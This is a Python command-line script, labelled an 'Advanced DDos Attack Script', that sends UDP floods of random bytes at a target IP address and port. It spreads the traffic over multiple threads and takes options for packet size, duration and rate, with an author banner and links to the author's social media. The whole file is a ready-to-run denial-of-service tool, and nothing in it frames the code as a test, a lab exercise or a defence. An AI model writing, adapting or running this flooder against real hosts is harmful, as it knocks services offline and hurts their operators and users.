import sys
import os
import time
import socket
import random
import threading
import argparse
import signal
import logging

# Configure logging
logging.basicConfig(filename='attack_log.txt', level=logging.INFO, format='%(asctime)s - %(threadName)s - %(message)s')

# Global variables to handle interruption
stop_event = threading.Event()

def attack(target_ip, target_port, packet_size, duration, rate_limit, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(packet_size)
    end_time = time.time() + duration
    sent = 0
    rate_interval = 1 / rate_limit if rate_limit > 0 else 0

    while time.time() < end_time and not stop_event.is_set():
        try:
            sock.sendto(bytes, (target_ip, target_port))
            sent += 1
            logging.info(f"Sent packet to {target_ip} through port: {target_port}")
            time.sleep(rate_interval)  # Rate limiting
        except Exception as e:
            logging.error(f"Error in thread-{thread_id}: {e}")
            break
    sock.close()

def signal_handler(sig, frame):
    print("\nInterrupt received. Stopping the attack...")
    stop_event.set()

def main():
    parser = argparse.ArgumentParser(description='Advanced DDos Attack Script')
    parser.add_argument('target_ip', type=str, help='IP address of the target')
    parser.add_argument('target_port', type=int, help='Port of the target')
    parser.add_argument('--size', type=int, default=1490, help='Size of the packet in bytes')
    parser.add_argument('--duration', type=int, default=60, help='Duration of the attack in seconds')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads to use')
    parser.add_argument('--rate', type=int, default=1000, help='Number of packets per second (rate limit)')
    args = parser.parse_args()

    signal.signal(signal.SIGINT, signal_handler)  # Handle Ctrl+C

    os.system("clear")
    os.system("figlet DDos Attack")
    print(f"\nAuthor   : HA-MRX")
    print(f"YouTube  : https://www.youtube.com/channel/UCCgy7i_A5yhAEdY86rPOinA")
    print(f"github   : https://github.com/Ha3MrX")
    print(f"Facebook : https://www.facebook.com/muhamad.jabar222\n")

    print(f"Target IP      : {args.target_ip}")
    print(f"Target Port    : {args.target_port}")
    print(f"Packet Size    : {args.size} bytes")
    print(f"Duration       : {args.duration} seconds")
    print(f"Threads        : {args.threads}")
    print(f"Rate Limit     : {args.rate} packets/second\n")

    os.system("figlet Attack Starting")
    for i in range(5):
        print(f"[{'=' * (i*20 // 5)}{' ' * (20 - i*20 // 5)}] {i * 25}% ")
        time.sleep(1)
    print("[====================] 100%")

    threads = []
    for i in range(args.threads):
        thread = threading.Thread(target=attack, args=(args.target_ip, args.target_port, args.size, args.duration, args.rate, i+1))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("Attack completed.")
    logging.info("Attack completed.")

if __name__ == "__main__":
    main()
